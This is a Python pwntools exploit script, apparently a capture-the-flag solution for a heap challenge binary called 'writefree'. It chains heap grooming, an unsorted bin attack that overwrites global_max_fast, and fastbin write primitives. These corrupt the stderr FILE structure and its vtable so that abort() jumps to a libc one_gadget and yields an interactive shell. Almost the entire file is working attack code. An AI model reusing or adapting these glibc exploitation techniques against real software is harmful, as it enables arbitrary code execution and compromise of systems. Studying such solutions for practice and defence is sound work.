#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./writefree"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

#### basic utils ####
def malloc(val: str, size: int):
    cmd = "{}=malloc({})".format(val, size)
    p.sendline(cmd)

def free(val: str):
    cmd = "free({})".format(val)
    p.sendline(cmd)

def read(val: str, buf):
    cmd = "{}=read({})".format(val, len(buf))
    p.sendline(cmd)
    p.send(buf)

#### offsets ####
one_gadget = 0x4f2c5
__default_morecore = libc.symbols['__default_morecore']
call_rax = 0x09b2a5
_IO_str_jumps = libc.symbols['_IO_str_jumps']

main_arena = libc.symbols['main_arena']
fastbinsY = main_arena + 0x10

__more_core = 0x3ec4d8

_IO_2_1_stderr_ = libc.symbols['_IO_2_1_stderr_']
_flags = _IO_2_1_stderr_ + 0x00
_IO_write_ptr = _IO_2_1_stderr_ + 0x28
_IO_buf_base = _IO_2_1_stderr_ + 0x38
_IO_buf_end = _IO_2_1_stderr_ + 0x40
vtable = _IO_2_1_stderr_ + 0xd8
_allocate_buffer = _IO_2_1_stderr_ + 0xe0

global_max_fast = libc.symbols['global_max_fast']

#### advanced utils ####
# convert address to chunk size (byte)
def size_chunk(addr: int):
    return p64((addr - fastbinsY) * 2 + 0x21)

# convert address to malloc size
def size_malloc(addr: int):
    return ((addr - fastbinsY) * 2 + 0x10)

log.info("heap feng shui")
malloc('A', 0x10)
malloc('B', 0x410)
malloc('C', 0x10)

# write safe value (for fastbin size check)
for addr in [
    _flags,
    _IO_write_ptr,
    _IO_buf_base,
    _IO_buf_end,
    vtable,
    _allocate_buffer,
    __more_core,
    global_max_fast - 0x8,
    global_max_fast + 0x8,
]:
    malloc('D', size_malloc(addr))
    free('D')
malloc('D', 0x10)

for addr in [
    _IO_buf_end,
    _allocate_buffer,
    __more_core,
]:
    malloc('E', size_malloc(addr))
    free('E')
malloc('E', 0x10)

malloc('F', 0x410)
malloc('G', 0x10)# stop merge in the top
free('F')# sent to unsorted bin
malloc('H', 0x420)# F will send to large bin

log.info("unsorted bin attack")
padding = b'x' * 0x18
free('B')
read('A',
    padding +
     p64(0x421) + # size
     p64(0) + # fd
     p64(global_max_fast - 0x10)[:2] # bk
)
malloc('B', 0x410)# global_max_fast is overwritten to main_arena+0x60


log.info("overwrite _IO_2_1_stderr_")
# edit and copy primitive (using fastbin)
def edit(addr, tamper):
    log.debug("call: edit({}, {})".format(hex(addr), tamper))
    read('C', padding + size_chunk(addr))
    free('D')
    read('C', padding + size_chunk(addr) + tamper)
    malloc('D', size_malloc(addr))

def copy(dst, src, tamper):
    log.debug("call: copy({}, {}, {})".format(hex(dst), hex(src), tamper))
    read('D', padding + size_chunk(dst))
    free('E')
    read('C', padding + size_chunk(dst))
    free('D')
    read('C', padding + size_chunk(dst) + p64(0xb0)[:1])
    malloc('D', size_malloc(dst))
    malloc('I', size_malloc(dst))
    read('C', padding + size_chunk(src))
    free('D')
    malloc('D', size_malloc(src))
    read('C', padding + size_chunk(dst) + tamper)
    malloc('D', size_malloc(dst))
    read('C', padding + p64(0x21))
    free('I')
    free('D')
    read('C', padding + p64(0x21) + p64(0xe0)[:1])
    malloc('D', 0x10)
    malloc('E', 0x10)


edit(_flags, p64(0))
edit(_IO_write_ptr, p64(2**64- 1))
edit(_IO_buf_base, p64(__default_morecore - one_gadget))
copy(_IO_buf_end, __more_core, b'')
edit(vtable, p64(_IO_str_jumps - 0x20)[:2])
copy(_allocate_buffer, __more_core, p64(call_rax)[:2])
# overwrite large bin chunk && call abort()
edit(global_max_fast - 0x8, p64(0x421))
read('C', padding + size_chunk(global_max_fast + 0x8))
free('D')
read('E', padding + p64(0x425))
malloc('F', 0x20)

p.interactive()
